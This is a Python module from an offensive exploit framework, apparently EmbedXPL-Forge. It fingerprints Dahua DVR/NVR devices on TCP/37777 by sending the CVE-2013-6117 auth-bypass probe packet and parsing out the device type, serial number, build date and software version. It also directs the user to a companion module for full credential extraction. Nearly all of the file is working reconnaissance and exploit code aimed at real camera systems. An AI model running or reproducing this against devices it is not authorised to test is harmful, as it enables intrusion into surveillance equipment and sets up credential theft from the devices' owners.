# Author: André Henrique (LinkedIn/X: @mrhenrike)
"""Dahua DVR/NVR Protocol Fingerprint Scanner (TCP/37777).

Scans for Dahua DVR and NVR devices by probing the proprietary Dahua binary
management protocol on TCP port 37777.  Leverages the CVE-2013-6117 auth-bypass
packet to confirm Dahua device presence and extract device metadata (firmware
version, serial number, device type).

Author: André Henrique (LinkedIn/X: @mrhenrike)
Version: 1.0.0
"""

import socket
import struct
import json
import re

from embedxpl.core.exploit import *
from embedxpl.core.exploit.exploit import BaseExploit

_DAHUA_PORT = 37777
_MAGIC = b"\xff\x00\x00\x96"
_PROBE = (
    b"\xff\x00\x00\x96"  # Magic
    b"\x00\x00\x00\x00"  # Session id
    b"\x00\x00\x00\x00"  # Sequence
    b"\x00\x00\x00\x00"  # Reserved
    b"\x58\x00\x00\x00"  # Msg ID
    b"\x00\x00\x00\x00"  # Payload length
)


def _recv_all(sock: socket.socket, size: int) -> bytes:
    """Read exactly 'size' bytes from socket."""
    data = b""
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            break
        data += chunk
    return data


class Exploit(BaseExploit):
    """Dahua DVR Protocol Fingerprint Scanner.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Dahua DVR Protocol Scanner",
        "description": (
            "Scans for Dahua DVR/NVR devices on TCP/37777 using the proprietary "
            "Dahua binary protocol. Exploits the CVE-2013-6117 auth-bypass probe to "
            "confirm device presence and extract firmware version, serial number, and "
            "device type metadata."
        ),
        "authors": (
            "Jake Reynolds (depth security)",
            "André Henrique (@mrhenrike) — EmbedXPL-Forge",
        ),
        "devices": (
            "Dahua DVR",
            "Dahua NVR",
            "Dahua white-label cameras",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(_DAHUA_PORT, "Target Dahua protocol port")
    timeout = OptInteger(8, "Socket timeout in seconds")

    def run(self) -> None:
        print_status("Probing Dahua protocol on {}:{}...".format(self.target, self.port))
        try:
            sock = socket.create_connection((self.target, self.port), timeout=self.timeout)
        except (socket.error, OSError) as exc:
            print_error("Connection failed: {}".format(exc))
            return

        try:
            sock.sendall(_PROBE)
            header = _recv_all(sock, 20)
            if len(header) < 20:
                print_error("Incomplete response — not a Dahua device")
                return

            magic = header[:4]
            if magic != _MAGIC:
                print_error("Invalid magic bytes — target is not a Dahua device")
                return

            payload_len = struct.unpack("<I", header[16:20])[0]
            payload = _recv_all(sock, payload_len) if payload_len else b""

            print_success("Dahua device confirmed on {}:{}".format(self.target, self.port))
            if payload:
                text = payload.decode("utf-8", errors="replace")
                # Extract key fields
                for field in ("DeviceType", "SerialNo", "BuildDate", "SoftWareVersion"):
                    m = re.search(rf'"{field}"\s*:\s*"([^"]+)"', text)
                    if m:
                        print_success("{}: {}".format(field, m.group(1)))
                print_status(
                    "Run exploits/cameras/dahua/dvr_auth_bypass_cve_2013_6117.py "
                    "for full credential extraction"
                )
        finally:
            sock.close()

    @mute
    def check(self) -> bool:
        try:
            sock = socket.create_connection((self.target, self.port), timeout=5)
            sock.sendall(_PROBE)
            data = sock.recv(4)
            sock.close()
            return data == _MAGIC
        except Exception:
            return False
